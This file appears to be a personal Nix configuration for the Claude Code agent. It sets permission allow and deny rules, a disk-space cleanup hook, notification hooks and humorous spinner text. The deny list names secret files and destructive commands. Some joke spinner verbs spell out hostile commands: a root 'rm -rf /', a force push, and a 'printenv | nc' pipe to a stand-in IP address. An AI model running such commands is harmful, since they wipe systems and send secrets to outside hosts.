{ pkgs, ... }:
{
  "$schema" = "https://json.schemastore.org/claude-code-settings.json";
  forceLoginMethod = "claudeai";
  attribution = {
    commit = "";
    pr = "";
  };
  alwaysThinkingEnabled = true;
  autoMemoryEnabled = false;
  # undocumented setting state that most likely controls when ill be shown another feedback survey
  # this timestsamp is in 2057
  feedbackSurveyState = {
    lastShownTime = 2754365161758;
  };
  statusLine = {
    type = "command";
    command =
      let
        statusline = pkgs.writeShellApplication {
          name = "claude-status-line";
          runtimeInputs = with pkgs; [
            jq
            git
            gawk
            coreutils
            bc
          ];
          text = builtins.readFile ./claudeStatusLine.sh;
        };
      in
      "${statusline}/bin/claude-status-line";
  };
  env = {
    CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS = "1";
    ENABLE_EXPERIMENTAL_MCP_CLI = "1";
    ENABLE_LSP_TOOL = "1";
    CLAUDE_AUTOCOMPACT_PCT_OVERRIDE = "40"; # using 1m model, compact at 40% to limit to 400k instead of 1m
  };
  plansDirectory = "./plans";
  permissions = {
    allow = [
      "Skill" # allow all skills

      "mcp__chrome-devtools"
      "mcp__context7"
      "mcp__github"
      "mcp__codex"

      "WebFetch(domain:github.com)"
      "WebSearch"

      "Bash(cat:*)"
      "Bash(head:*)"
      "Bash(tail:*)"
      "Bash(tree:*)"
      "Bash(wc:*)"
      "Bash(git:*)"
      "Bash(ls:*)"
      "Bash(pwd)"
      "Bash(file:*)"
      "Bash(grep:*)"
      "Bash(rg:*)"
      "Bash(find:*)"
      "Bash(fd:*)"
      "Bash(jq:*)"

    ];
    deny = [
      "Bash(sudo:*)"
      "Bash(rm:*)"
      "Bash(rm -rf:*)"
      "Bash(git push:*)"
      "Bash(git commit:*)"
      "Bash(git reset:*)"
      "Bash(git rebase:*)"
      "Read(.env)"
      "Read(.env.*)"
      "Read(id_rsa)"
      "Read(id_ed25519)"
    ];
  };
  hooks =
    let
      jq = "${pkgs.jq}/bin/jq";
      notify-send = "${pkgs.libnotify}/bin/notify-send";
      cargoDiskGuard = pkgs.writeShellApplication {
        name = "cargo-disk-guard";
        runtimeInputs = with pkgs; [
          jq
          coreutils
          gawk
        ];
        # NOTE: `cargo` is intentionally NOT pinned here -- we want the same
        # cargo/toolchain the project uses, resolved from the ambient PATH.
        text = ''
          PAYLOAD=$(cat)
          CWD=$(printf '%s' "$PAYLOAD" | jq -r '.cwd // empty' 2>/dev/null || true)
          [ -n "$CWD" ] || CWD=$PWD

          # --- cheap common path: ~3ms, no cargo fork ---
          # df -Pk <path> reports the fs physically holding <path>: -P forces
          # single-line POSIX output, -k forces 1024-byte blocks (portable
          # across Linux & macOS). Column 4 is available KiB. We measure at
          # CWD, which is always on the same volume as the workspace root.
          AVAIL_KB=$(df -Pk "$CWD" 2>/dev/null | awk 'NR==2 {print $4}' || true)
          [ -n "$AVAIL_KB" ] || exit 0
          THRESHOLD_KB=$((10 * 1024 * 1024)) # 10 GiB
          [ "$AVAIL_KB" -lt "$THRESHOLD_KB" ] || exit 0 # ~99% of calls exit here

          # --- expensive path only runs when disk is genuinely low (~31ms) ---
          cd "$CWD" 2>/dev/null || exit 0
          command -v cargo >/dev/null 2>&1 || exit 0
          ROOT_MANIFEST=$(cargo locate-project --workspace --message-format plain 2>/dev/null || true)
          [ -n "$ROOT_MANIFEST" ] || exit 0
          # Nothing to reclaim if there's no target dir yet.
          # (Caveat: ignores a relocated CARGO_TARGET_DIR.)
          [ -d "$(dirname "$ROOT_MANIFEST")/target" ] || exit 0

          cargo clean --manifest-path "$ROOT_MANIFEST" >/dev/null 2>&1 || true
          # Tell the agent why target/ vanished, so a sudden full rebuild
          # doesn't look like a mystery.
          printf '%s\n' '{"hookSpecificOutput":{"hookEventName":"PostToolUse","additionalContext":"Workspace disk volume dropped below 10GiB free; ran `cargo clean` to reclaim space. The next build will recompile from scratch."}}'
          exit 0
        '';
      };
      notifyHook = pkgs.writeShellScript "notify-hook" ''
        PAYLOAD=$(cat)
        TYPE=$(echo "$PAYLOAD" | ${jq} -r '.hook_event_name')
        TITLE="Claude"
        MESSAGE=""

        pretty_cwd() {
          echo "$PAYLOAD" | ${jq} -r '.cwd' | awk -F'/' '{print $(NF-1)"/"$NF}'
        }

        if [ "$TYPE" == "Notification" ]; then
          TITLE="Claude - Action Required"
          MESSAGE=$(echo "$PAYLOAD" | ${jq} -r '.message')
          MESSAGE="$MESSAGE at $(pretty_cwd)"
        elif [ "$TYPE" == "Stop" ]; then
          TITLE="Claude - Ready"
          CWD=$(echo "$PAYLOAD" | ${jq} -r '.cwd')
          MESSAGE="Waiting for input at $(pretty_cwd)"
        fi

        if [ ! -z "$MESSAGE" ] && [ "$MESSAGE" != "null" ]; then
          if [ "$(uname)" == "Linux" ]; then
            ${notify-send} "$TITLE" "$MESSAGE"
          elif [ "$(uname)" == "Darwin" ]; then
            # osascript is builtin on darwin
            osascript -e "display notification \"$MESSAGE\" with title \"$TITLE\""
          fi
        fi
      '';
    in
    {
      PostToolUse = [
        {
          matcher = "Bash";
          hooks = [
            {
              type = "command";
              command = "${cargoDiskGuard}/bin/cargo-disk-guard";
            }
          ];
        }
      ];
      Notification = [
        {
          matcher = ".*";
          hooks = [
            {
              type = "command";
              command = "${notifyHook}";
            }
          ];
        }
      ];
      Stop = [
        {
          matcher = ".*";
          hooks = [
            {
              type = "command";
              command = "${notifyHook}";
            }
          ];
        }
      ];
    };
  spinnerVerbs = {
    mode = "replace";
    verbs = [
      "Fuckin' around"
      "Draggin' my heels"
      "Breaking prod"
      "Making shit up"
      "Bash(sudo rm -rf /)"
      "Scraping StackOverflow"
      "Asking ChatGPT"
      "Hallucinating"
      "Vibing"
      "Committing API keys"
      "Bash(git commit -am 'yolo' && git push origin/master --force)"
      "An Infosys agent is connecting"
      "Bash(printenv | nc 198.51.100.23 4444)"
      "Committing token fraud"
    ];
  };
}
